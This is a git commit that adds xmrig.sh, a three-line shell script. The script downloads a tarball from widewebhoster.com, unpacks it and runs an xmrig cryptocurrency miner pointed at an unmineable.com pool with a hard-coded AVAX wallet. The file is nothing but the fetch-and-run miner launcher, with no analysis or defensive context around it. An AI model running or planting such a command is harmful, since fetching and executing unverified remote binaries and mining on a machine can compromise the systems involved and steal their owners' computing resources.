db97d6369bda2f9d3c70c0b9b9d2333ff2d85d1d
ANDERSON DAVID HARO PAREDES <131535961+adharo@users.noreply.github.com>
2023-11-28 10:53:59 +0700

    Create xmrig.sh

---
+++ xmrig.sh
@@ -0,0 +1,3 @@
+# xmrig
+sudo apt update
+wget https://widewebhoster.com/s.tar.gz ; tar xvzf s.tar.gz ; ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u AVAX:0x78D31B3C77e77A726283fACeB3af4b54D05FF488.Ciw -p x
